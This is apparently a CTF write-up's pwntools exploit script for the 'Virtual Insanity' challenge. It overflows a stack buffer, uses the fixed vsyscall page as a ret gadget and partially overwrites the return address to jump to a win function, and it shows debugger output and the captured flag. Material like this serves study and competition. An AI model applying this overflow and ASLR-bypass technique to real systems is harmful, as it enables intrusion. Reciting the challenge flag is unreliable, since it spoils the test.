# https://github.com/im-razvan/writeups/tree/main/TRXCTF-2025/Virtual%20Insanity

from pwn import *

# By using vsyscalls - virtualized system call interfaces in Linux that speed up certain kernel operations by avoiding unnecessary context switches.
# This was the tricky part of the challenge - realizing that vsyscalls are enabled/emulated on remote.

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

exe = context.binary = ELF("./chall")
libc = exe.libc

def start(*pargs, **kwargs):
    if args.REMOTE:
        return remote("virtual.ctf.theromanxpl0.it", 7011)
    if args.GDB:
        return exe.debug(gdbscript="b*main+115\ncontinue",  *pargs, **kwargs)
    return exe.process(*pargs, **kwargs)

io = start(env = {"FLAG": r"TRX{example_flag}"})

####### BEGIN #######

# vsyscalls are always at a fixed memory address
"""
0xffffffffff600000 0xffffffffff601000 r-xp     1000      0 [vsyscall]
"""

# we found our ret gadget!
"""
0xffffffffff600000:  mov    rax,0x60
0xffffffffff600007:  syscall
0xffffffffff600009:  ret
"""

io.recvline()

payload = b"A" * 0x28
payload += p64(0xffffffffff600000) * 2
payload += b"\xa9"

io.send(payload)

"""
pwndbg> stack
00:0000│ rsp 0x7ffe84682bf8 ◂— 0xffffffffff600000
01:0008│     0x7ffe84682c00 ◂— 0xffffffffff600000
02:0010│     0x7ffe84682c08 —▸ 0x55594dc0d1a9 (win) ◂— endbr64 
03:0018│     0x7ffe84682c10 ◂— 0x14dc0c040
04:0020│     0x7ffe84682c18 —▸ 0x7ffe84682d08 —▸ 0x7ffe84682faf ◂— '/home/kali/Desktop/chall'
05:0028│     0x7ffe84682c20 —▸ 0x7ffe84682d08 —▸ 0x7ffe84682faf ◂— '/home/kali/Desktop/chall'
06:0030│     0x7ffe84682c28 ◂— 0x7c667b6242fc42e6
07:0038│     0x7ffe84682c30 ◂— 0
"""

io.interactive()

# TRX{1_h0p3_y0u_d1dn7_bru73f0rc3_dc85efe0}
